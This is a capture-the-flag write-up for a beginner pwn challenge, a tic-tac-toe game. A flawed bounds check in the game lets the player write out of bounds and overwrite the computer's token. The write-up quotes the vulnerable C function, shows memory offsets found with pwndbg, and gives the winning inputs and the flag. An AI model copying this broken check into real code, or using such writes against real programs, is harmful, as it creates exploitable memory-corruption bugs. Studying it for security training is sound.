# pwn/tic-tac-no Writeup
475 solves | 101 points | Difficulty: Baby  
**TLDR: Beat a perfect tic-tac-toe CPU by writing to out of bounds memory**
## Description
```
Tic-tac-toe is a draw when played perfectly. Can you be more perfect than my perfect bot?
```
The challenge consists of 3 files: A dockerfile, `chall.c`, and `chall`.  
The first is the pwn jail configuration, the second is the challenge source code, and the last is the compiled binary.
## Solve
`chall.c` is a program that simulates a game of tic-tac-toe between a player and a CPU. To obtain the flag, the player must match 3 of their own tokens (the `X`) in a row on the board, setting `winner == player` and printing out the flag. The CPU uses a simple minimax algorithm to make a move, making sure to make avoid losing, a simple task given that tic-tac-toe has very few possible game states for the CPU to check. Thus in order to win and obtain the flag, you will need to cheat.  
The function of interest in `chall.c` is the `playerMove()` function, which handles the input and makes the appropriate player move. This function takes in two numbers `x` and `y`, converts it to a board index, checks if the move is valid, that is that the index is within the range of the board and does not already contain a marker, then makes the move and exits the function.
```
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // Should be safe, given that the user cannot overwrite tiles on the board
         break;
      }
   }while(1);
}
```
The problem with this is that this checks first that the index is within bounds before checking if `board[index]` is occupied, meaning that if the values of `x` and `y` are of an out of bounds index, this condition is never checked. In other words, this function allows a player token to be inserted anywhere within memory as long as it is not within the board.  
With that in mind, where else could the token be written to? It couldn't be to another token on the board, as that is protected by the `if` condition within the function. It could be written to the `winner` variable within the `main()` loop, but the problem is that everytime a token is added, the `checkWin()` function checks that there isn't a win on the board and overwrites the `X`, preventing the win condition from being met.  
However, the `player` and `computer` tokens defined at the beginning of the program are stored as `char` rather than `const char`, meaning that rather than being hardcoded into the program, they're stored in memory instead. Given that the player token can be written to **anywhere** in memory outside the board, writing the token to the `computer` variable would cause the CPU to put down player tokens as well as the player. Since the win condition simply checks if the winning token matches the player's token, this would allow the player to win.  
Thus, the objective is to find where the `computer` variable is stored in memory, overwrite it, and win tic-tac-toe. Using pwngdb and the provided binary, the address of the computer variable is `0x555555558051` and the address of the start of the board is `0x555555558068`. 
```
pwndbg> hexdump 0x555555558050
+0000 0x555555558050  58 4f 00 00 00 00 00 00  80 b7 e1 f7 ff 7f 00 00  │XO......│........│
+0010 0x555555558060  00 00 00 00 00 00 00 00  20 20 20 20 20 20 20 20  │........│........│
+0020 0x555555558070  20 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
```
Given that `board` is a char array, every index corresponds to a single byte. Since the computer variable is located 23 bytes before the start of the board, overwriting it simply means to run `board[index] = player` with an `index` of -23. There are many values of x and y that will result in index being -23, including (-7,2) and (1,-22). Use any to change the computer token and winning tic-tac-toe is trivial from here.
### Demonstration
```
You want the flag? You'll have to beat me first!
   |   |
---|---|---
   |   |
---|---|---
   |   |

Enter row #(1-3): -7
Enter column #(1-3): 2
   |   |
---|---|---
   | X |
---|---|---
   |   |

Enter row #(1-3): 1
Enter column #(1-3): 1

 X |   |
---|---|---
   | X |
---|---|---
   |   | X

How's this possible? Well, I guess I'll have to give you the flag now.
lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
```
The resulting flag is `lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`